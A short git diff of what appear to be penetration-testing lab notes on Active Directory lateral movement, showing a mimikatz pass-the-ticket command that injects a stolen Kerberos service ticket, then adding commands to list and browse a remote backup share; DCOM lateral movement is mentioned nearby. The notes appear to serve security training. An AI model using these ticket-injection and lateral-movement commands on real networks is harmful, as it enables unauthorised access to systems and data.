@@ -1323,8 +1323,11 @@ Login to DC
     ```
   - Pick any TGS ticket in dave@cifs-web04.kirbi and inject it to our session  
     `mimikatz # kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi`  
-  - Inspecting the injected ticket in memory  
+  - Inspecting the injected ticket in memory   
     `klist` #server: cifs/web04
+  - Access the web04  
+    `PS C:\Tools>net view \\web04` #backup
+    `PS C:\Tools>ls \\web04\backup`
 - DCOM
   - CLIENT74 (Jen) to FILES04
   - From an elevated PowerShell, instantiate a remote MMC 2.0 application by specifying the target IP of FILES04  
